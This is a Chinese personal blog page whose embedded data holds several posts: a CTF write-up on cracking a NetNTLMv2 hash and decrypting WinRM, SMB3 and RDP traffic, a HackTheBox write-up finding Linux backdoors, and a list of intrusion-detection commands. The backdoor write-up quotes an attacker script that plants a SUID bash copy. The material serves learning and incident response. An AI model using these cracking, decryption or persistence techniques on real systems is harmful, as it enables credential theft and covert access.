cle-card reveal search-page-box"><p class="search-intro">小提示：支持关键词实时搜索，结果会直接显示在下方哦。</p><div class="article-content prose"><form class="search-wrapper search-fallback-form" role="search"><label class="sr-only" for="search-fallback-input">搜索站点内容</label> <input id="search-fallback-input" type="search" placeholder="输入关键词搜索文章、页面或标签"></form></div><div class="article-content prose"><div id="search-fallback-results" class="search-results"><p class="search-empty">输入关键词后，这里会显示匹配的文章、页面和标签。</p></div><script id="search-fallback-data" type="application/json">{"pages":[],"pagesStructure":{},"posts":[{"id":15,"title":"软件系统安全赛区域赛(果子面包赛区) —— pth_attcak","author":{"id":1,"name":"QAQ","username":"qaq","avatar":"","avatarImage":{"alt":"QAQ","height":240,"url":"","width":240},"email":"","website":"","description":"","postsNumber":7,"url":"https://lq-a-ql.github.io/qaq/qaq/index.html","featuredImage":{},"config":{},"additionalData":{},"template":"","authorViewConfig":{}},"slug":"ruan-jian-xi-tong-an-quan-sai-qu-yu-saiguo-zi-mian-bao-sai-qu-pth_attcak","url":"https://lq-a-ql.github.io/ruan-jian-xi-tong-an-quan-sai-qu-yu-saiguo-zi-mian-bao-sai-qu-pth_attcak.html","text":"<blockquote>\n<p>所有人都嘲笑我在机房啃果子面包，但他们不知道的是十天后丧尸病毒爆发，果子面包成了唯一解药</p></blockquote>\n<p>抛开赛方的抽象行为不谈，这题其实出的还不错，和24强网杯的谍影重重很类似</p><p>先来分析思路</p><p>附件只有两个流量包</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260421203756780.png\" alt=\"image-20260421203756780\" data-is-external-image=\"true\"></figure></p><p>其中</p><p><code>1-pth.pcapng</code>中是一段<code>winrm</code>流量和一段<code>SMB3</code>加密（中间还传了一个猕猴桃），其中在<code>SMB3</code>相关流量中可以看到用户<code>administrator</code>和用户<code>admin</code></p><p><code>2-rdp.pcapng</code>则是经过<code>tls</code>加密过的<code>RDP</code>流量</p><p>那么一个整体的思路就是先从<code>winrm</code>流量中找到<code>administrator</code>或者<code>admin</code>的密码或<code>NT HASH</code> 然后解密<code>SMB3</code>流量找出<code>TLS</code>证书再还原<code>RDP</code>流</p><hr>\n<p>解密<code>winrm</code>就需要拿到密码，而从流量中拿到密码的唯一方式就是爆破<code>NTLMv2</code></p><p>筛选<code>http</code>协议定位到<code>winrm</code>登录成功的流量</p><figure class=\"post__image\"><img src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260421205227107.png\" alt=\"image-20260421205227107\" data-is-external-image=\"true\"></figure><p>接着就可以看到哈希</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260421205602404.png\" alt=\"image-20260421205602404\" data-is-external-image=\"true\"></figure></p><p>唔….但只有这个还不够，还需要从前一条流量（就是<code>info</code>里有<code>NTLMSSP_CHALLENGE</code>的那个）把<code>challenge</code>摘出来</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260421210953924.png\" alt=\"image-20260421210953924\" data-is-external-image=\"true\"></figure></p><p>然后整理一下下(<code>$NETNTLMv2$USERNAME+domain$challenge$NTProofstr$blob</code> )</p><pre><code class=\"language-text\">$NETNTLMv2$ADMINISTRATORpc$cd0a6722277096c9$3fa965e4d9af9a92bde5cefcdd309acb$010100000000000022a2d32cbc72dc01ff545caf96411c670000000002000a0044004500310041005900010004005000430004001200640065003100610079002e0063006f006d0003001800500043002e00640065003100610079002e0063006f006d0005001200640065003100610079002e0063006f006d000700080022a2d32cbc72dc010600040002000000080030003000000000000000000000000030000026544cc05c735b21ae876ab6adeaf35030fb649315896d1d685326c99ddb5f6b0a001000000000000000000000000000000000000900220048005400540050002f00310030002e00310030002e00310030002e00320030003100000000000000000000000000\n</code></pre>\n<p>然后就可以丢给<code>john</code>爆破就好啦，字典就用<code>kali</code>自带的<code>rockyou</code>字典</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260421212227219.png\" alt=\"image-20260421212227219\" data-is-external-image=\"true\"></figure></p><p>好啦，就拿到了密码<code>pass@word1</code></p><p>接下来就是解密<code>winrm</code>，这边呢我再github上找到一个脚本</p><p><a href=\"https://github.com/h4sh5/decrypt-winrm/blob/main/winrm_decrypt.py\">https://github.com/h4sh5/decrypt-winrm/blob/main/winrm_decrypt.py</a></p><pre><code class=\"language-powershell\">python .\\winrm_decrypt.py -p pass@word1 .\\1-pth.pcapng\n</code></pre>\n<p>下下来后用上述命令就可以解密啦，不过他遇到错误帧会直接奔溃，这个可以喊天才程序员稍微改一改，我就不放我改完的了，太长了</p><p>唔…由于脚本还原出来的是<code>XML</code>原文，所以还要写个脚本把命令提取出来</p><pre><code class=\"language-python\">import re\nimport base64\n\n\nwith open(&quot;winrm.txt&quot;, &quot;r&quot;, encoding=&quot;utf-16&quot;) as f:  #唔....这里主要是脚本提出来的是utf-16编码\n    text=f.read()\n\npattern = r&#39;(?&lt;![A-Za-z0-9+/=])(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?(?![A-Za-z0-9+/=])&#39;\n#base64 正则筛选喵\nmatches = re.findall(pattern, text)\n\nfor i,s in enumerate(matches, 1):\n    try:\n        payload = base64.b64decode(s).decode(&quot;utf-8&quot;)\n        if payload and payload[0].isalnum():\n            print(payload, end=&quot;\\n-------------------\\n&quot;)\n    except UnicodeDecodeError:\n        pass\n\n\n\n</code></pre>\n<p>保存结果到记事本上慢慢看</p><p>然后就找到了<code>administrator</code>的<code>NT HASH</code></p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260421214337432.png\" alt=\"image-20260421214337432\" data-is-external-image=\"true\"></figure></p><p>好那么接下来就是解密<code>SMB3</code>了，这边我又在github找到一个小脚本</p><p><a href=\"https://github.com/iamdonu/SMB3-Decryption/blob/main/randomSessionKeyNTLM.py\">https://github.com/iamdonu/SMB3-Decryption/blob/main/randomSessionKeyNTLM.py</a></p><p>这个不用改奥，直接用就好啦</p><pre><code class=\"language-powershell\">python .\\randomSessionKeyNTLM.py -u administrator --domain= -n 3d83254b53697355ef7498b535e7ab29 -p 4103e8d84572fa74f220ecc20be704c1 -k 7433d4ac87cdff2d38b2e8a5840b919d\n</code></pre>\n<p>解释一下参数</p><ul>\n<li><code>-k session key</code></li>\n</ul>\n<p>​<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-04-21%20215003.png\" alt=\"dsfsdfsdf\" data-is-external-image=\"true\"></figure></p><ul>\n<li><code>-p NTProofstr</code></li>\n</ul>\n<p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260421215208285.png\" alt=\"image-20260421215208285\" data-is-external-image=\"true\"></figure></p><ul>\n<li><code>-n NT HASH</code></li>\n<li><code>--domain</code></li>\n</ul>\n<p>​\t这里留空是因为流量里他没有域（这里记一下<code>sessionid</code>，后面要用）</p><p>​\t<figure class=\"post__image\"><img src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260421215328809.png\" alt=\"image-20260421215328809\" data-is-external-image=\"true\"></figure></p><p>然后运行脚本，拿到<code>key:3252507a61756f507132585748475953</code></p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260421215439642.png\" alt=\"image-20260421215439642\" data-is-external-image=\"true\"></figure></p><p>接着回到wireshark里开始解密流量（注意一下协议树里的hex都是小端序，所以填的时候要倒一下）</p><p>​\t<figure class=\"post__image\"><img src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260421215753086.png\" alt=\"image-20260421215753086\" data-is-external-image=\"true\"></figure></p><p>然后，就能看到一部分解密后的<code>SMB3</code>啦</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260421220036782.png\" alt=\"image-20260421220036782\" data-is-external-image=\"true\"></figure></p><p>然后就是一样的流程，不过呢要先把这个密码哈希一下，用<code>cyberchef</code>就行，就不贴出来了</p><p>解密后就可以看到上传的证书</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260421220442948.png\" alt=\"image-20260421220442948\" data-is-external-image=\"true\"></figure></p><p>唔…不过有密码，就是猕猴桃的默认密码<code>mimikatz</code></p><p>然后用<code>openssl</code>从证书中导出私钥就好啦</p><pre><code class=\"language-bash\">openssl pkcs12 -in ./%5cLOCAL_MACHINE_Remote\\ Desktop_0_WIN-PJQQGRU9QOC.pfx -nocerts -nodes -out private-key.pem -passin pass:mimikatz\n</code></pre>\n<p>然后回到wireshark解密<code>2-rdp.pcapng</code></p><p>​\t<figure class=\"post__image\"><img src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260421221611149.png\" alt=\"image-20260421221611149\" data-is-external-image=\"true\"></figure></p><p>接着导出<code>PDU</code>，也就是将解密后的解密后的上层流量单独导出来</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260421223627210.png\" alt=\"image-20260421223627210\" data-is-external-image=\"true\"></figure></p><p>然后就可以使用<code>pyrdp</code>库啦</p><pre><code class=\"language-bash\">pyrdp-convert -o pyrdpout ./rdp.pcap \n</code></pre>\n<p>这里导出<code>.pyrdp</code>文件（用<code>wsl</code>啊，烧杯<code>windows</code>会报非法路径，抽象的很）</p><p>接着打开<code>pyrdp-player</code>就可以查看还原的<code>rdp</code>信息啦，包括键盘行为，鼠标行为，理论上来讲屏幕也可以还原来着但这没有，反正美美拿到flag</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260421223419188.png\" alt=\"image-20260421223419188\" data-is-external-image=\"true\"></figure></p><p>赛方说要大写，反正我没看出来哪里大写了，<code>sync</code> 里<code>capslock</code>都是<code>False</code>，抽象</p><p>下一篇文章会简单讲讲<code>winrm</code> <code>SMB3</code>的加密原理和怎么手动解密，但是不知道什么时候更新了说是，抽象排课早八排到晚九，诶哟</p><hr>\n<h2 id=\"广告时间--\">广告时间~ ~ ~</h2>\n<p>项目地址: <a href=\"https://github.com/lQ-A-Ql/Gshark\">https://github.com/lQ-A-Ql/Gshark</a></p><p>关于我的Gshark哈，也是托这个抽象比赛的福，给了我一点灵感，加上了<code>winrm</code>解密和<code>SMB3</code> 的<code>Random SK</code> 生成，不细说了，直接看结果叭</p><p>​\t<img src=\"C:\\Users\\QAQ\\AppData\\Roaming\\Typora\\typora-user-images\\image-20260421224515873.png\" alt=\"image-20260421224515873\" style=\"zoom: 50%;\"  data-is-external-image=\"true\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260421224610707.png\" alt=\"image-20260421224610707\" style=\"zoom: 50%;\"  data-is-external-image=\"true\"><img src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260421224654358.png\" alt=\"image-20260421224654358\" style=\"zoom:50%;\"  data-is-external-image=\"true\"></p><p>然后还顺便更新了一下图标嘻嘻</p><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/图片添加斜体Gshark字样.png\" alt=\"asdasdada\" style=\"zoom:25%;\"  data-is-external-image=\"true\">\n\n<img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/media_1776768170.png\" alt=\"media_1776768170\" style=\"zoom:25%;\"  data-is-external-image=\"true\">","excerpt":"所有人都嘲笑我在机房啃果子面包，但他们不知道的是十天后丧尸病毒爆发，果子面包成了唯一解药 抛开赛方的抽象行为不谈，这题其实出的还不错，和24强网杯的谍影重重很类似 先来分析思路 附件只有两个流量包 ​ 其中 1-pth.pcapng中是一段winrm流量和一段SMB3加密（中间还传了一个猕猴桃），其中在SMB3相关流量中可以看到用户administrator和用户admin 2-rdp.pcapng则是经过tls加密过的RDP流量 那么一个整体的思路就是先从winrm流量中找到administrator或者admin的密码或NT HASH 然后解密SMB3流量找出TLS证书再还原RDP流 解密winrm就需要拿到密码，而从流量中拿到密码的唯一方式就是爆破NTLMv2 筛选http协议定位到winrm登录成功的流量 接着就可以看到哈希 ​ 唔….但只有这个还不够，还需要从前一条流量（就是info里有NTLMSSP_CHALLENGE的那个）把challenge摘出来 ​ 然后整理一下下($NETNTLMv2$USERNAME+domain$challenge$NTProofstr$blob ) $NETNTLMv2$ADMINISTRATORpc$cd0a6722277096c9$3fa965e4d9af9a92bde5cefcdd309acb$010100000000000022a2d32cbc72dc01ff545caf96411c670000000002000a0044004500310041005900010004005000430004001200640065003100610079002e0063006f006d0003001800500043002e00640065003100610079002e0063006f006d0005001200640065003100610079002e0063006f006d000700080022a2d32cbc72dc010600040002000000080030003000000000000000000000000030000026544cc05c735b21ae876ab6adeaf35030fb649315896d1d685326c99ddb5f6b0a001000000000000000000000000000000000000900220048005400540050002f00310030002e00310030002e00310030002e00320030003100000000000000000000000000 然后就可以丢给john爆破就好啦，字典就用kali自带的rockyou字典 ​ 好啦，就拿到了密码pass@word1 接下来就是解密winrm，这边呢我再github上找到一个脚本 https://github.com/h4sh5/decrypt-winrm/blob/main/winrm_decrypt.py python .\\winrm_decrypt.py -p pass@word1 .\\1-pth.pcapng&hellip;","createdAt":1776783232133,"modifiedAt":1776786012282,"status":"published","isFeatured":false,"isHidden":false,"isExcludedOnHomepage":false,"hasGallery":false,"template":"","hasCustomExcerpt":false,"editor":"markdown","metaDescription":"","featuredImage":{},"tags":[],"hiddenTags":[],"mainTag":false,"postViewConfig":{}},{"id":14,"title":" Linux入侵检测——例题（PersistenceIsFutile）","author":{"id":1,"name":"QAQ","username":"qaq","avatar":"","avatarImage":{"alt":"QAQ","height":240,"url":"","width":240},"email":"","website":"","description":"","postsNumber":7,"url":"https://lq-a-ql.github.io/qaq/qaq/index.html","featuredImage":{},"config":{},"additionalData":{},"template":"","authorViewConfig":{}},"slug":"linuxru-qin-jian-ce-li-tipersistenceisfutile","url":"https://lq-a-ql.github.io/linuxru-qin-jian-ce-li-tipersistenceisfutile.html","text":"<blockquote>\n<p><a href=\"https://app.hackthebox.com/challenges/PersistenceIsFutile?tab=play_challenge\">https://app.hackthebox.com/challenges/PersistenceIsFutile?tab=play_challenge</a></p><p>Hackers made it onto one of our production servers 😅. We’ve isolated it from the internet until we can clean the machine up. The IR team reported eight difference backdoors on the server, but didn’t say what they were and we can’t get in touch with them. We need to get this server back into prod ASAP - we’re losing money every second it’s down. Please find the eight backdoors (both remote access and privilege escalation) and remove them. Once you’re done, run <strong>/root/solveme</strong> as <strong>root</strong> to check. You have SSH access and <strong>sudo</strong> rights to the box with the connections details attached below.</p><p>username: <strong>user</strong></p><p>password: <strong>hackthebox</strong></p><p>黑客侵入了我们的一台生产服务器😅。我们已经把它和网络隔离了直到我们把机器清理干净。IR团队报告了服务器上八个不同的后门，但没有说它们是什么，我们无法与他们取得联系。我们需要尽快让这个服务器恢复正常——它每停机一秒钟，我们就会损失一笔钱。请找到八个后门（包括远程访问和特权升级）并删除它们。完成后，以root身份运行/root/solveme进行检查。您具有SSH访问权限和sudo权限，并具有下面附加的连接详细信息。</p><p>ps：被64核256g内存的容器吓哭了，HTB你是这个</p></blockquote>\n<p>咕了这么久也是终于开始写这篇文章了，唔…怎么说呢，我有点想分几个角度来讲，顺便也分享一下我自己做入侵检测题的思路</p><h2 id=\"排查系统配置文件和用户文件\">排查系统配置文件和用户文件</h2>\n<ul>\n<li><code>/home</code> <code>/root</code></li>\n</ul>\n<p><code>/home/user</code> 下有一个很明显的后门<code>.backdoor</code></p><p>​\t<figure class=\"post__image\"><img src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260414202529728.png\" alt=\"image-20260414202529728\" data-is-external-image=\"true\"></figure></p><p><code>/root</code>下就很正常 (其实不然，后面再看)</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260414202802198.png\" alt=\"image-20260414202802198\" data-is-external-image=\"true\"></figure></p><ul>\n<li><code>~/.bashrc</code> <code>profile</code></li>\n</ul>\n<p><code>/home/user/.bashrc</code> </p><p>一个劫持<code>cat</code>反弹shell的小后门</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260414213828208.png\" alt=\"image-20260414213828208\" data-is-external-image=\"true\"></figure></p><p><code>/root/.bashrc</code>\n​\t<figure class=\"post__image\"><img src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260414203814834.png\" alt=\"image-20260414203814834\" data-is-external-image=\"true\"></figure></p><p>明显的反弹shell，顺着这一条路来看看<code>alertd</code>在哪</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260414203924816.png\" alt=\"image-20260414203924816\" data-is-external-image=\"true\"></figure></p><p>就找到了另一个后门</p><ul>\n<li><code>/etc/passwd</code></li>\n</ul>\n<p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260414204106266.png\" alt=\"image-20260414204106266\" data-is-external-image=\"true\"></figure></p><p>可以看到有一个很明显的后门用户 <code>gnats</code> 依据是从UID来看，他是一个系统用户，但是他的GID却是0，同时解释器为<code>/bin/bash</code>（对系统用户来说正常的解释器应该是<code>/usr/bin/nologin</code>之类的，总之不能使<code>bash</code> <code>sh</code> <code>zsh</code> 三类shell）</p><p>唔….那么推测一下，黑客有可能是创建了一个后门用户再伪装成系统用户，也有可能是直接劫持的系统用户</p><ul>\n<li><code>sudoers</code></li>\n</ul>\n<p>一切正常哈</p><ul>\n<li><code>alias</code></li>\n</ul>\n<p>在<code>user</code>用户的别名下，可以看到攻击者劫持了<code>cat</code>来反弹shell，与<code>user/.bashrc </code>中一致\n​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260414204721024.png\" alt=\"image-20260414204721024\" data-is-external-image=\"true\"></figure></p><p><code>root</code> 下一切正常</p><blockquote>\n<p>这里要是看到了 <code>.bashrc</code> 里没有的别名就要翻别的配置文件喽~</p></blockquote>\n<ul>\n<li><code>~/.ssh</code></li>\n</ul>\n<p>这个嘛，就要回到最开始了，可以发现<code>/root</code>下有<code>.ssh</code>目录，并且还有<code>authorized_keys</code>文件\n​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260414204936288.png\" alt=\"image-20260414204936288\" data-is-external-image=\"true\"></figure></p><p>ok啊，<code>cat</code> 一下看看，发现了另一个后门用户\n​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260414205105405.png\" alt=\"image-20260414205105405\" data-is-external-image=\"true\"></figure></p><h2 id=\"排查网络连接活动进程\">排查网络连接/活动进程</h2>\n<ul>\n<li><code>netstat -pantu</code></li>\n</ul>\n<p>可以看到上一个环节排查到的两个后门</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260414205323484.png\" alt=\"image-20260414205323484\" data-is-external-image=\"true\"></figure></p><ul>\n<li><code>ps -aux</code></li>\n</ul>\n<p>可以就看到奇奇怪怪的进程，PID还和刚刚<code>netstat</code>查出来的后门对上了</p><figure class=\"post__image\"><img src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260414205901742.png\" alt=\"image-20260414205901742\" data-is-external-image=\"true\"></figure><p>过去瞅瞅，很明显的反弹shell</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260414210105319.png\" alt=\"image-20260414210105319\" data-is-external-image=\"true\"></figure></p><p>关于这个洞啊，还有一个小坑，就是当尝试<code>kill</code>进程的时候会发现他<code>kill</code>不掉，那么就说明他还存在着一个守护进程，直接根目录狠狠爆搜</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260414210415837.png\" alt=\"image-20260414210415837\" data-is-external-image=\"true\"></figure></p><p>找到守护进程</p><h2 id=\"排查定时任务\">排查定时任务</h2>\n<ul>\n<li><code>crontab</code></li>\n</ul>\n<p><code>root</code> 下没有定时任务</p><p><code>user</code> 下就能看到下一个后门</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260414210552444.png\" alt=\"image-20260414210552444\" data-is-external-image=\"true\"></figure></p><ul>\n<li><code>/etc/cron*</code></li>\n</ul>\n<p>注意这俩（唔…不知道看哪个的话有个最简单的方式就是这几个都看一遍）</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260414211103379.png\" alt=\"image-20260414211103379\" data-is-external-image=\"true\"></figure></p><p><code>access-up</code></p><pre><code class=\"language-bash\">#!/bin/bash\n\n\nDIRS=(&quot;/bin&quot; &quot;/sbin&quot;)\nDIR=${DIRS[$[ $RANDOM % 2 ]]}\n\nwhile : ; do\n    NEW_UUID=$(cat /dev/urandom | tr -dc &#39;a-z&#39; | fold -w 6 | head -n 1)\n    [[ -f &quot;{$DIR}/${NEW_UUID}&quot; ]] || break\ndone\n\ncp /bin/bash ${DIR}/${NEW_UUID}\ntouch ${DIR}/${NEW_UUID} -r /bin/bash\nchmod 4755 ${DIR}/${NEW_UUID}\n</code></pre>\n<p>注意最后一句啊，给程序赋4755权限，也就是给SUID位赋值了哈</p><p>那么依旧，根目录爆搜</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260414212235362.png\" alt=\"image-20260414212235362\" data-is-external-image=\"true\"></figure></p><p>发现一堆后门，包括最开始就找到的<code>.backdoor</code>文件（怎么判断是后门呢——文件名奇奇怪怪自己不认识，网上又查不到的都是可疑文件）</p><p><code>pyssh</code></p><pre><code class=\"language-bash\">#!/bin/sh\n\nVER=$(python3 -c &#39;import ssh_import_id; print(ssh_import_id.VERSION)&#39;)\nMAJOR=$(echo $VER | cut -d&#39;.&#39; -f1)\n\nif [ $MAJOR -le 6 ]; then\n    /lib/python3/dist-packages/ssh_import_id_update\nfi\n</code></pre>\n<p>乍一看，好像没什么问题，但是用<code>python</code>运行一下就会发现根本没有装这个库（另外，谁家好人直接运行库文件的，而且人github仓库里也搜不到这个文件）</p><p>过去看看\n​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260414213545955.png\" alt=\"image-20260414213545955\" data-is-external-image=\"true\"></figure></p><p>确实是一个往<code>authorized_keys</code>塞东西的脚本</p><h2 id=\"排查服务timer\">排查服务/timer</h2>\n<ul>\n<li><code>/etc/systemd/system</code></li>\n</ul>\n<p>这个题嘛，挺正常的，没看到什么奇奇怪怪的东西</p><h2 id=\"最后\">最后</h2>\n<p>最后，该改改，该删删，然后去拿flag就好啦</p><p>总结一下叭，其实可以发现，上述几个方面会有许多重叠的地方。大家可以将他们当作自己做入侵检测题时的入口点参考，而不是排查顺序（因为我感觉顺序这个东西倒没那么重要，反而入口点难找，找到入口点后其余的顺腾摸瓜也就出来了）</p>","excerpt":"https://app.hackthebox.com/challenges/PersistenceIsFutile?tab=play_challenge Hackers made it onto one of our production servers 😅. We’ve isolated it from the internet until we can clean the machine up. The IR team reported eight difference&hellip;","createdAt":1776174885789,"modifiedAt":1776174910148,"status":"published","isFeatured":false,"isHidden":false,"isExcludedOnHomepage":false,"hasGallery":false,"template":"","hasCustomExcerpt":false,"editor":"markdown","metaDescription":"","featuredImage":{},"tags":[],"hiddenTags":[],"mainTag":false,"postViewConfig":{}},{"id":13,"title":"Coming~","author":{"id":1,"name":"QAQ","username":"qaq","avatar":"","avatarImage":{"alt":"QAQ","height":240,"url":"","width":240},"email":"","website":"","description":"","postsNumber":7,"url":"https://lq-a-ql.github.io/qaq/qaq/index.html","featuredImage":{},"config":{},"additionalData":{},"template":"","authorViewConfig":{}},"slug":"coming~","url":"https://lq-a-ql.github.io/coming~.html","text":"<h2 id=\"猜猜我在哪\">猜猜我在哪~</h2>\n<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/0b3758a2867f87c9e03b2b3c0ea28843.jpeg\" alt=\"0b3758a2867f87c9e03b2b3c0ea28843\" data-is-external-image=\"true\"></figure>","excerpt":"猜猜我在哪~","createdAt":1775993366685,"modifiedAt":1775993366685,"status":"published","isFeatured":false,"isHidden":false,"isExcludedOnHomepage":false,"hasGallery":false,"template":"","hasCustomExcerpt":false,"editor":"markdown","metaDescription":"","featuredImage":{},"tags":[],"hiddenTags":[],"mainTag":false,"postViewConfig":{}},{"id":12,"title":"Linux入侵检测——常用命令","author":{"id":1,"name":"QAQ","username":"qaq","avatar":"","avatarImage":{"alt":"QAQ","height":240,"url":"","width":240},"email":"","website":"","description":"","postsNumber":7,"url":"https://lq-a-ql.github.io/qaq/qaq/index.html","featuredImage":{},"config":{},"additionalData":{},"template":"","authorViewConfig":{}},"slug":"linuxru-qin-jian-ce-chang-yong-ming-ling","url":"https://lq-a-ql.github.io/linuxru-qin-jian-ce-chang-yong-ming-ling.html","text":"<blockquote>\n<p>水一篇常用的命令，为下一篇文章的例题做个小铺垫</p></blockquote>\n<h2 id=\"查询网络\">查询网络</h2>\n<h3 id=\"netstat\"><code>netstat</code></h3>\n<p>先来看看<code>netstat</code>的常用的选项</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260410200459211.png\" alt=\"image-20260410200459211\" data-is-external-image=\"true\"></figure></p><p>好，那么接下来我们要做的就是把他们拼起来，当我们想查询所有网络连接情况时，就可以使用</p><pre><code class=\"language-bash\">netstat -pantu\n</code></pre>\n<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260410200733006.png\" alt=\"image-20260410200733006\" data-is-external-image=\"true\"></figure><h3 id=\"ss\"><code>ss</code></h3>\n<p>同样的，先来查看有哪些选项，可以看到与<code>netstat</code>很相似</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260410200823866.png\" alt=\"image-20260410200823866\" data-is-external-image=\"true\"></figure></p><p>既然如此，那么如果要使用<code>ss</code>查看所有连接同样可以使用</p><pre><code class=\"language-bash\">ss -pantu\n</code></pre>\n<p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260410201258886.png\" alt=\"\t\" data-is-external-image=\"true\"></figure></p><h2 id=\"查询进程\">查询进程</h2>\n<h3 id=\"ps\"><code>ps</code></h3>\n<p>可以使用<code>ps aux</code>查看当前的进程情况\t\n​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260410211808372.png\" alt=\"image-20260410211808372\" data-is-external-image=\"true\"></figure></p><p>其中</p><ul>\n<li><code>a</code> 列出当前终端运行的所有进程</li>\n<li><code>u</code> 列出进程所属用户信息</li>\n<li><code>x</code> 列出后台进程</li>\n</ul>\n<p>此外还可以使用其他选项进行更加细致的排查</p><pre><code class=\"language-bash\">-p &lt;PID&gt; #展示特定PID的进程\n-u &lt;username&gt; #展示特定用户的进程\n-C &lt;command&gt; #依据命令行查询进程\n-f #全格式输出\n</code></pre>\n<h3 id=\"top\"><code>top</code></h3>\n<p>与<code>ps</code>  相比<code>top</code> 则会实时动态展示进程情况</p><p>​\t<figure class=\"post__image\"><img loading=\"lazy\" src=\"https://raw.githubusercontent.com/lQ-A-Ql/blog-image/main/image-20260410212609399.png\" alt=\"image-20260410212609399\" data-is-external-image=\"true\"></figure></p><p>如图所示，上半部分表示当前时刻整体的资源利用情况，下班部分则是各个进程的资源占用情况以及命令行参数</p><p>同样的，<code>top</code>命令也有几个较为常用的选项</p><pre><code class=\"language-bash\">-o %CPU #按cpu占用率排序\n-o %MEM #按内存占用排序\n</code></pre>\n<h2 id=\"过滤搜索\">过滤/搜索</h2>\n<h3 id=\"find\"><code>find</code></h3>\n<p><code>find</code> 的功能还是蛮多的，我分点说叭</p><ul>\n<li><p><code>-mtime/-mmin</code> 按时间搜索</p><ul>\n<li>这个选项有一个参数<code>n</code>，其中<ul>\n<li><code>+n</code>表示 n天/分钟 之前</li>\n<li><code>-n</code>表示 n天/分钟 之内</li>\n<li><code>n</code> 表示具体的某天/某分钟</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><code>-name/-iname</code> 